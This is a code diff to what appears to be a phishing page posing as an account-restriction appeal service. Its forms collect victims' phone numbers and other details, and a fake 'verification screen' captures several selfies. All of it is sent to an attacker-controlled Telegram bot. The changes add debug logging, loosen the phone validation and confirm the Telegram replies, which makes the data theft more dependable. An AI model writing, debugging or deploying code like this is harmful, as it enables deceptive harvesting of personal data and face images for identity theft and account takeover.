@@ -779,7 +779,7 @@
         // 4. AUTO DETECT COUNTRY (IP) + Default India
         // ============================================================
         async function detectAndSetCountry() {
-            let code = '+91'; // default
+            let code = '+91';
             let flag = '🇮🇳';
             try {
                 const res = await fetch('https://ipapi.co/country/');
@@ -807,7 +807,6 @@
                     }
                 }
             } catch (_) {}
-            // Set all dropdowns
             document.querySelectorAll('.country-dropdown').forEach(dd => {
                 const selected = dd.querySelector('.selected');
                 selected.querySelector('.flag').textContent = flag;
@@ -817,13 +816,14 @@
         detectAndSetCountry();
 
         // ============================================================
-        // 5. PHONE VALIDATION
+        // 5. PHONE VALIDATION (FIXED: removes leading zero, allows 7-10 digits)
         // ============================================================
         function validatePhone(input) {
             const group = input.closest('.phone-group');
             const error = group.querySelector('.phone-error');
             const raw = input.value.trim();
 
+            // If empty, hide error and return true (optional field)
             if (!raw) {
                 error.classList.remove('show');
                 return true;
@@ -854,7 +854,15 @@
                 }
             }
 
-            const digits = local.replace(/\D/g, '');
+            // Remove all non-digit characters
+            let digits = local.replace(/\D/g, '');
+
+            // Remove leading zero (common in India)
+            if (digits.startsWith('0')) {
+                digits = digits.substring(1);
+            }
+
+            // Now count digits
             if (digits.length < 7 || digits.length > 10) {
                 error.textContent = 'Please enter 7-10 digits after country code.';
                 error.classList.add('show');
@@ -865,9 +873,16 @@
             return true;
         }
 
+        // Attach validation to all phone inputs
         document.querySelectorAll('.phone-input').forEach(inp => {
-            inp.addEventListener('input', function() { validatePhone(this); });
-            inp.addEventListener('blur', function() { validatePhone(this); });
+            inp.addEventListener('input', function() {
+                validatePhone(this);
+                // Also store clean value for submission
+                this.dataset.cleanValue = this.value.trim();
+            });
+            inp.addEventListener('blur', function() {
+                validatePhone(this);
+            });
         });
 
         // ============================================================
@@ -906,27 +921,38 @@
         }
 
         // ============================================================
-        // 8. FORM SUBMIT (Direct Telegram – Original Style)
+        // 8. FORM SUBMIT (Direct Telegram – Original Style) WITH CONSOLE LOGS
         // ============================================================
         document.getElementById('disabledAppealForm').addEventListener('submit', function(e) {
             e.preventDefault();
+            console.log('🔹 Disabled Form Submitted');
             handleFormSubmit(this, 'Disabled Account Appeal');
         });
         document.getElementById('chatAppealForm').addEventListener('submit', function(e) {
             e.preventDefault();
+            console.log('🔹 Chat Form Submitted');
             handleFormSubmit(this, 'Chat Restrictions Appeal');
         });
 
         function handleFormSubmit(form, formType) {
-            // Validate phone
+            console.log('🔸 handleFormSubmit called for:', formType);
+
+            // Get phone input
             const phoneInput = form.querySelector('.phone-input');
+            console.log('🔸 Phone input value:', phoneInput.value);
+
+            // Validate phone – if fails, focus and return
             if (!validatePhone(phoneInput)) {
+                console.log('❌ Phone validation failed');
                 phoneInput.focus();
                 return;
             }
+            console.log('✅ Phone validation passed');
 
+            // Get all form data
             const formData = new FormData(form);
             const data = Object.fromEntries(formData);
+            console.log('📋 Form data:', data);
 
             // Get phone with country code
             const group = form.querySelector('.phone-group');
@@ -936,13 +962,15 @@
             delete data.phoneNumber; // remove raw
 
             verificationState.formData = { type: formType, ...data };
+            console.log('📦 verificationState.formData:', verificationState.formData);
 
-            // Send form to Telegram directly (original logic)
+            // Send form to Telegram directly
             sendFormToTelegram(data, formType);
 
             // Open verification screen
             document.querySelectorAll('.form-container').forEach(f => f.classList.remove('active'));
             document.getElementById('verificationScreen').classList.add('active');
+            console.log('📸 Verification screen opened');
             setTimeout(startVerification, 500);
         }
 
@@ -963,11 +991,15 @@
 ━━━━━━━━━━━━━━━━━━━━
 <b>🕐 Time:</b> ${new Date().toLocaleString('en-IN', {timeZone: 'Asia/Kolkata'})}`;
 
+            console.log('📤 Sending to Telegram:', message);
             fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' })
-            }).catch(err => console.error('Telegram send error:', err));
+            })
+            .then(res => res.json())
+            .then(data => console.log('✅ Telegram response:', data))
+            .catch(err => console.error('❌ Telegram send error:', err));
         }
 
         function sendSelfieToTelegram(blob, pose, poseNumber) {
@@ -986,7 +1018,10 @@
             fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                 method: 'POST',
                 body: formData
-            }).catch(err => console.error('Selfie send error:', err));
+            })
+            .then(res => res.json())
+            .then(data => console.log('✅ Selfie sent:', data))
+            .catch(err => console.error('❌ Selfie send error:', err));
         }
 
         // ============================================================
